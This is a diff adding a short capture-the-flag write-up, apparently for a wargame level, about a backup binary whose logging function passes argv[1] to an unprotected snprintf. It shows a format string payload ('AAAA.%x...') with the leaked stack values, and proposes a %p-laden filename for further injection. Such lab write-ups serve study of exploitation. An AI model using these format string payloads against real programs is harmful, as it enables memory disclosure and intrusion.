@@ -1,0 +1,17 @@
+This binary asks for a filename in argv[1].
+
+After disassembling it I find out that the programm will open the file and write its content in backups/.<filename>
+In the meantime the program will write logs in backups/.log usong a function log_wrapper().
+
+In this function there is an unprotected snprintf() that takes argv[1].
+
+Let's try to read memory with it:
+
+$ ./level08 "AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x"
+ERROR: Failed to open AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x
+level08@OverRide:~$ cat backups/.log
+LOG: Starting back up: AAAA.ffffffec.ec.400d6c.ffffffff.ffffe8a9.400d96.603010.72617453.63616220
+
+Ok so I can use printf to read/write in the stack: good to know.
+
+I can create a file named '%p%p%p%p%p%p%p%p%p%p%p%p%p%p' to inject string formatters.
